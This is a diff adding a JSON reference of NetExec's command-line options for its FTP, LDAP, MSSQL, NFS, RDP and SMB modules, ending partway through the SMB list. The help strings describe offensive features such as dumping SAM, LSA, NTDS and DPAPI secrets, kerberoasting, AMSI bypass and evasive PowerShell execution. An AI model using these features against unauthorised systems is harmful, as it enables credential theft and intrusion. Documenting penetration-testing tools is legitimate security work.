@@ -1,0 +1,3787 @@
+{
+  "netexec_commit": "3e0e37e8b563602d94938adf92725da269f8dafe",
+  "protocols": {
+    "ftp": {
+      "source": "nxc/protocols/ftp/proto_args.py",
+      "options": [
+        {
+          "flags": [
+            "--port"
+          ],
+          "help": "FTP port",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--ls"
+          ],
+          "help": "List all files (including hidden) in the directory",
+          "metavar": "DIRECTORY",
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--cat"
+          ],
+          "help": "Display the contents of a file. Example: --cat /path/to/file",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--get"
+          ],
+          "help": "Download a file",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--put"
+          ],
+          "help": "Upload a file",
+          "metavar": [
+            "LOCAL_FILE",
+            "REMOTE_FILE"
+          ],
+          "choices": null,
+          "nargs": 2
+        }
+      ]
+    },
+    "ldap": {
+      "source": "nxc/protocols/ldap/proto_args.py",
+      "options": [
+        {
+          "flags": [
+            "-H",
+            "--hash"
+          ],
+          "help": "NTLM hash(es) or file(s) containing NTLM hashes",
+          "metavar": "HASH",
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--simple-bind"
+          ],
+          "help": "Use simple bind authentication (no signing/sealing)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--port"
+          ],
+          "help": "LDAP port",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--ldap-timeout"
+          ],
+          "help": "LDAP connection timeout",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-d"
+          ],
+          "help": "domain to authenticate to",
+          "metavar": "DOMAIN",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--asreproast"
+          ],
+          "help": "Output AS_REP response to crack with hashcat to file",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--kerberoasting",
+            "--kerberoast"
+          ],
+          "help": "Output TGS ticket to crack with hashcat to file",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--kerberoast-account"
+          ],
+          "help": "Target specific accounts for kerberoasting (sAMAccountNames or file containing sAMAccountNames)",
+          "metavar": null,
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--targeted-kerberoast"
+          ],
+          "help": "Adds temporary SPN to specified users, requests ST, then remove added SPN. Specify sAMAccountNames or file containing sAMAccountNames",
+          "metavar": null,
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--no-preauth-targets"
+          ],
+          "help": "Specify accounts that should be kerberoasted using an account without pre-authentication requirement.",
+          "metavar": null,
+          "choices": null,
+          "nargs": 1
+        },
+        {
+          "flags": [
+            "--base-dn"
+          ],
+          "help": "base DN for search queries",
+          "metavar": "BASE_DN",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--query"
+          ],
+          "help": "Query LDAP with a custom filter and attributes",
+          "metavar": null,
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--find-delegation"
+          ],
+          "help": "Finds delegation relationships within an Active Directory domain. (Enabled Accounts only)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--trusted-for-delegation"
+          ],
+          "help": "Get the list of users and computers with flag TRUSTED_FOR_DELEGATION",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--password-not-required"
+          ],
+          "help": "Get the list of users with flag PASSWD_NOTREQD",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--admin-count"
+          ],
+          "help": "Get user that had the value adminCount=1",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--users"
+          ],
+          "help": "Enumerate domain users",
+          "metavar": null,
+          "choices": null,
+          "nargs": "*"
+        },
+        {
+          "flags": [
+            "--users-export"
+          ],
+          "help": "Enumerate domain users and export them to the specified file",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--groups"
+          ],
+          "help": "Enumerate domain groups, if a group is specified than its members are enumerated",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--ous"
+          ],
+          "help": "Specify OU name to query all users in that OU or list all OUs",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--computers"
+          ],
+          "help": "Enumerate domain computers",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--dc-list"
+          ],
+          "help": "Enumerate Domain Controllers",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--get-sid"
+          ],
+          "help": "Get domain sid",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--active-users"
+          ],
+          "help": "Get Active Domain Users Accounts",
+          "metavar": null,
+          "choices": null,
+          "nargs": "*"
+        },
+        {
+          "flags": [
+            "--pso"
+          ],
+          "help": "Get Fine Grained Password Policy/PSOs",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--pass-pol"
+          ],
+          "help": "Dump password policy",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--gmsa"
+          ],
+          "help": "Enumerate GMSA passwords",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--gmsa-convert-id"
+          ],
+          "help": "Get the secret name of specific gmsa or all gmsa if no gmsa provided",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--gmsa-decrypt-lsa"
+          ],
+          "help": "Decrypt the gmsa encrypted value from LSA",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--bloodhound"
+          ],
+          "help": "Perform a Bloodhound scan. Default collector: Bloodhound CE, for legacy support see config file",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-c",
+            "--collection"
+          ],
+          "help": "Which information to collect. Supported: Group, LocalAdmin, Session, Trusts, Default, DCOnly, DCOM, RDP, PSRemote, LoggedOn, Container, ObjectProps, ACL, ADCS, All. You can specify more than one by separating them with a comma.",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        }
+      ]
+    },
+    "mssql": {
+      "source": "nxc/protocols/mssql/proto_args.py",
+      "options": [
+        {
+          "flags": [
+            "-H",
+            "--hash"
+          ],
+          "help": "NTLM hash(es) or file(s) containing NTLM hashes",
+          "metavar": "HASH",
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--port"
+          ],
+          "help": "MSSQL port",
+          "metavar": "PORT",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--mssql-timeout"
+          ],
+          "help": "SQL server connection timeout",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-q",
+            "--query"
+          ],
+          "help": "execute the specified query against the mssql db",
+          "metavar": "QUERY",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--database"
+          ],
+          "help": "list databases or list tables for NAME",
+          "metavar": "NAME",
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "-d"
+          ],
+          "help": "domain name",
+          "metavar": "DOMAIN",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--local-auth"
+          ],
+          "help": "authenticate locally to each target",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--sam"
+          ],
+          "help": "dump SAM hashes from target systems",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--lsa"
+          ],
+          "help": "dump LSA secrets from target systems",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--dpapi"
+          ],
+          "help": "dump DPAPI secrets from target systems, can dump cookies if you add 'cookies', will not dump SYSTEM dpapi if you add nosystem",
+          "metavar": null,
+          "choices": [
+            "cookies",
+            "nosystem"
+          ],
+          "nargs": "*"
+        },
+        {
+          "flags": [
+            "--mkfile"
+          ],
+          "help": "DPAPI option. File with masterkeys in form of {GUID}:SHA1",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--pvk"
+          ],
+          "help": "DPAPI option. File with domain backupkey",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--db-hash"
+          ],
+          "help": "dump local database hashes",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--no-output"
+          ],
+          "help": "do not retrieve command output",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-x"
+          ],
+          "help": "execute the specified command",
+          "metavar": "COMMAND",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-X"
+          ],
+          "help": "execute the specified PowerShell command",
+          "metavar": "PS_COMMAND",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--force-ps32"
+          ],
+          "help": "Force the PowerShell command to run in a 32-bit process via a job; WARNING: depends on the job completing quickly, so you may have to increase the timeout",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--obfs"
+          ],
+          "help": "Obfuscate PowerShell ran on target; WARNING: Defender will almost certainly trigger on this",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--amsi-bypass"
+          ],
+          "help": "File with a custom AMSI bypass",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": 1
+        },
+        {
+          "flags": [
+            "--clear-obfscripts"
+          ],
+          "help": "Clear all cached obfuscated PowerShell scripts",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--no-encode"
+          ],
+          "help": "Do not encode the PowerShell command ran on target",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--put-file"
+          ],
+          "help": "Put a local file into remote target, ex: whoami.txt C:\\\\Windows\\\\Temp\\\\whoami.txt",
+          "metavar": [
+            "SRC_FILE",
+            "DEST_FILE"
+          ],
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--get-file"
+          ],
+          "help": "Get a remote file, ex: C:\\\\Windows\\\\Temp\\\\whoami.txt whoami.txt",
+          "metavar": [
+            "SRC_FILE",
+            "DEST_FILE"
+          ],
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--rid-brute"
+          ],
+          "help": "enumerate users by bruteforcing RIDs",
+          "metavar": "MAX_RID",
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--list-backups"
+          ],
+          "help": "dump database backups path",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        }
+      ]
+    },
+    "nfs": {
+      "source": "nxc/protocols/nfs/proto_args.py",
+      "options": [
+        {
+          "flags": [
+            "--port"
+          ],
+          "help": "NFS portmapper port (default: %(default)s)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--nfs-timeout"
+          ],
+          "help": "NFS connection timeout (default: %(default)ss)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--share"
+          ],
+          "help": "Specify a share, e.g. for --ls, --get-file, --put-file",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--shares"
+          ],
+          "help": "List NFS shares",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--enum-shares"
+          ],
+          "help": "Authenticate and enumerate exposed shares recursively (default depth: %(const)s)",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--ls"
+          ],
+          "help": "List files in the specified NFS share. Example: --ls /",
+          "metavar": "PATH",
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--cat"
+          ],
+          "help": "Display the contents of an NFS file. Example: --cat /path/to/file",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--get-file"
+          ],
+          "help": "Download remote NFS file. Example: --get-file remote_file local_file",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--put-file"
+          ],
+          "help": "Upload remote NFS file with chmod 777 permissions to the specified folder. Example: --put-file local_file remote_file",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--chmod"
+          ],
+          "help": "Change permissions of remote NFS file. Example: --chmod 777 /path/to/file",
+          "metavar": [
+            "PERMISSIONS",
+            "FILE"
+          ],
+          "choices": null,
+          "nargs": 2
+        }
+      ]
+    },
+    "rdp": {
+      "source": "nxc/protocols/rdp/proto_args.py",
+      "options": [
+        {
+          "flags": [
+            "-H",
+            "--hash"
+          ],
+          "help": "NTLM hash(es) or file(s) containing NTLM hashes",
+          "metavar": "HASH",
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--port"
+          ],
+          "help": "RDP port",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--rdp-timeout"
+          ],
+          "help": "RDP timeout on socket connection",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--nla-screenshot"
+          ],
+          "help": "Screenshot RDP login prompt if NLA is disabled",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-d"
+          ],
+          "help": "domain to authenticate to",
+          "metavar": "DOMAIN",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--local-auth"
+          ],
+          "help": "authenticate locally to each target",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--screenshot"
+          ],
+          "help": "Screenshot RDP if connection success",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--screentime"
+          ],
+          "help": "Time to wait for desktop image",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--res"
+          ],
+          "help": "Resolution in WIDTHxHEIGHT format",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-x"
+          ],
+          "help": "execute the specified command",
+          "metavar": "COMMAND",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-X"
+          ],
+          "help": "execute the specified PowerShell command",
+          "metavar": "PS_COMMAND",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--cmd-delay"
+          ],
+          "help": "Sleep time before executing command",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--clipboard-delay"
+          ],
+          "help": "Maximum time to wait for clipboard initialization (seconds)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--no-output"
+          ],
+          "help": "do not retrieve command output",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        }
+      ]
+    },
+    "smb": {
+      "source": "nxc/protocols/smb/proto_args.py",
+      "options": [
+        {
+          "flags": [
+            "-H",
+            "--hash"
+          ],
+          "help": "NTLM hash(es) or file(s) containing NTLM hashes",
+          "metavar": "HASH",
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--delegate"
+          ],
+          "help": "Impersonate user with S4U2Self + S4U2Proxy",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--spn"
+          ],
+          "help": "SPN to use for the Service Ticket. With --delegate it's the SPN used for S4U2Proxy (defaults to cifs/<target>).",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--generate-st"
+          ],
+          "help": "Store a Service Ticket in the specified file. Use with --delegate to save the S4U ST, or without --delegate (together with --spn) to request a regular ST for the given SPN",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--self"
+          ],
+          "help": "Only do S4U2Self, no S4U2Proxy (use with delegate)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--u2u"
+          ],
+          "help": "Use User-to-User (U2U) authentication with S4U2Self",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-d",
+            "--domain"
+          ],
+          "help": "domain to authenticate to",
+          "metavar": "DOMAIN",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--local-auth"
+          ],
+          "help": "authenticate locally to each target",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--port"
+          ],
+          "help": "SMB port",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--share"
+          ],
+          "help": "specify a share",
+          "metavar": "SHARE",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--smb-server-port"
+          ],
+          "help": "specify a server port for SMB",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--no-smbv1"
+          ],
+          "help": "Force to disable SMBv1 in connection",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--no-admin-check"
+          ],
+          "help": "Avoid checking admin which queries the Service Control Manager",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--gen-relay-list"
+          ],
+          "help": "outputs all hosts that don't require SMB signing to the specified file",
+          "metavar": "OUTPUT_FILE",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--smb-timeout"
+          ],
+          "help": "SMB connection timeout",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--laps"
+          ],
+          "help": "LAPS authentication",
+          "metavar": "LAPS",
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--generate-hosts-file"
+          ],
+          "help": "Generate a hosts file like from a range of IP",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--generate-krb5-file"
+          ],
+          "help": "Generate a krb5 file like from a range of IP",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--generate-tgt"
+          ],
+          "help": "Generate a tgt ticket",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--sam"
+          ],
+          "help": "dump SAM hashes from target systems",
+          "metavar": null,
+          "choices": [
+            "regdump",
+            "secdump"
+          ],
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--lsa"
+          ],
+          "help": "dump LSA secrets from target systems",
+          "metavar": null,
+          "choices": [
+            "regdump",
+            "secdump"
+          ],
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--ntds"
+          ],
+          "help": "dump the NTDS.dit from target DCs using the specifed method",
+          "metavar": null,
+          "choices": [
+            "drsuapi",
+            "vss"
+          ],
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--history"
+          ],
+          "help": "Also retrieve password history (NTDS.dit or SAM)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--kerberos-keys"
+          ],
+          "help": "Also dump Kerberos AES and DES keys from target DC (NTDS.dit)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--enabled"
+          ],
+          "help": "Only dump enabled targets from DC (NTDS.dit)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--user"
+          ],
+          "help": "Dump selected user from DC (NTDS.dit)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--trust-keys"
+          ],
+          "help": "Dump Trusted Domain Object (TDO) secrets and derive inter-realm Kerberos/RC4 keys (NTDS.dit)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--just-trust-keys"
+          ],
+          "help": "Like --trust-keys but dump ONLY the trust keys, skipping every account secret (NTDS.dit)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--dpapi"
+          ],
+          "help": "dump DPAPI secrets from target systems, can dump cookies if you add 'cookies', will not dump SYSTEM dpapi if you add nosystem",
+          "metavar": null,
+          "choices": [
+            "cookies",
+            "nosystem"
+          ],
+          "nargs": "*"
+        },
+        {
+          "flags": [
+            "--sccm"
+          ],
+          "help": "dump SCCM secrets from target systems",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--mkfile"
+          ],
+          "help": "DPAPI option. File with masterkeys in form of {GUID}:SHA1",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--pvk"
+          ],
+          "help": "DPAPI option. File with domain backupkey",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--list-snapshots"
+          ],
+          "help": "Lists the VSS snapshots (default: %(const)s)",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--shares"
+          ],
+          "help": "Enumerate shares and access, filter on specified argument (read ; write ; read,write)",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--exclude-shares"
+          ],
+          "help": "List of shares to exclude from enumeration (e.g., C$ Admin$ IPC$)",
+          "metavar": null,
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--dir"
+          ],
+          "help": "List the content of a path (default path: '%(const)s')",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--interfaces"
+          ],
+          "help": "Enumerate network interfaces",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--file-write-check"
+          ],
+          "help": "Use file creation to check WRITE access on shares (default: ACL-based check, no disk writes)",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--filter-shares"
+          ],
+          "help": "Filter share by access, option 'READ' 'WRITE' or 'READ,WRITE'",
+          "metavar": null,
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--disks"
+          ],
+          "help": "Enumerate disks",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--users"
+          ],
+          "help": "Enumerate domain users, if a user is specified than only its information is queried.",
+          "metavar": "USER",
+          "choices": null,
+          "nargs": "*"
+        },
+        {
+          "flags": [
+            "--users-export"
+          ],
+          "help": "Enumerate domain users and export them to the specified file",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--groups"
+          ],
+          "help": "Enumerate domain groups, if a group is specified than its members are Enumerated",
+          "metavar": "GROUP",
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--local-groups"
+          ],
+          "help": "Enumerate local groups, if a group is specified then its members are Enumerated",
+          "metavar": "GROUP",
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--computers"
+          ],
+          "help": "Enumerate computer users",
+          "metavar": "COMPUTER",
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--pass-pol"
+          ],
+          "help": "dump password policy",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--rid-brute"
+          ],
+          "help": "Enumerate users by bruteforcing RIDs",
+          "metavar": "MAX_RID",
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--smb-sessions"
+          ],
+          "help": "Enumerate active smb sessions",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--reg-sessions"
+          ],
+          "help": "Enumerate users sessions using the Remote Registry. If a username is given, filter for it. If a file is given, filter for listed usernames. If no value is given, list all.",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--loggedon-users"
+          ],
+          "help": "Enumerate logged on users, if a user is specified than a regex filter is applied.",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--loggedon-users-filter"
+          ],
+          "help": "only search for specific user, works with regex",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--qwinsta"
+          ],
+          "help": "Enumerate user sessions. If a username is given, filter for it; if a file is given, filter for listed usernames. If no value is given, list all.",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--tasklist"
+          ],
+          "help": "Enumerate running processes and filter for the specified one if specified",
+          "metavar": null,
+          "choices": null,
+          "nargs": "?"
+        },
+        {
+          "flags": [
+            "--taskkill"
+          ],
+          "help": "Kills a specific PID or a proces name's PID's",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--wmi-query"
+          ],
+          "help": "Issues the specified WMI query",
+          "metavar": "QUERY",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--wmi-namespace"
+          ],
+          "help": "WMI Namespace (default: %(default)s)",
+          "metavar": "NAMESPACE",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--spider"
+          ],
+          "help": "share to spider",
+          "metavar": "SHARE",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--spider-folder"
+          ],
+          "help": "folder to spider",
+          "metavar": "FOLDER",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--content"
+          ],
+          "help": "enable file content searching",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--exclude-dirs"
+          ],
+          "help": "directories to exclude from spidering",
+          "metavar": "DIR_LIST",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--depth"
+          ],
+          "help": "max spider recursion depth",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--only-files"
+          ],
+          "help": "only spider files",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--silent"
+          ],
+          "help": "Do not print found files/directories",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--pattern"
+          ],
+          "help": "pattern(s) to search for in folders, filenames and file content",
+          "metavar": null,
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--regex"
+          ],
+          "help": "regex(s) to search for in folders, filenames and file content",
+          "metavar": null,
+          "choices": null,
+          "nargs": "+"
+        },
+        {
+          "flags": [
+            "--put-file"
+          ],
+          "help": "Put a local file into remote target, ex: whoami.txt \\\\Windows\\\\Temp\\\\whoami.txt",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--get-file"
+          ],
+          "help": "Get a remote file, ex: \\\\Windows\\\\Temp\\\\whoami.txt whoami.txt",
+          "metavar": "FILE",
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--get-folder"
+          ],
+          "help": "Get a remote directory, ex: \\\\Windows\\\\Temp\\\\testing testing",
+          "metavar": "DIR",
+          "choices": null,
+          "nargs": 2
+        },
+        {
+          "flags": [
+            "--recursive"
+          ],
+          "help": "Recursively get a folder",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--ignore-empty-folders"
+          ],
+          "help": "Ignore empty folders when downloading",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--append-host"
+          ],
+          "help": "append the host to the get-file filename",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--exec-method"
+          ],
+          "help": "method to execute the command. Ignored if in MSSQL mode",
+          "metavar": null,
+          "choices": [
+            "atexec",
+            "mmcexec",
+            "smbexec",
+            "wmiexec"
+          ],
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--dcom-timeout"
+          ],
+          "help": "DCOM connection timeout",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--get-output-tries"
+          ],
+          "help": "Number of times atexec/smbexec/mmcexec tries to get results",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--codec"
+          ],
+          "help": "Set encoding used (codec) from the target's output. If errors are detected, run chcp.com at the target & map the result with https://docs.python.org/3/library/codecs.html#standard-encodings and then execute again with --codec and the corresponding codec",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--no-output"
+          ],
+          "help": "do not retrieve command output",
+          "metavar": null,
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-x"
+          ],
+          "help": "execute the specified CMD command",
+          "metavar": "COMMAND",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "-X"
+          ],
+          "help": "execute the specified PowerShell command",
+          "metavar": "PS_COMMAND",
+          "choices": null,
+          "nargs": null
+        },
+        {
+          "flags": [
+            "--obfs"
+          ],
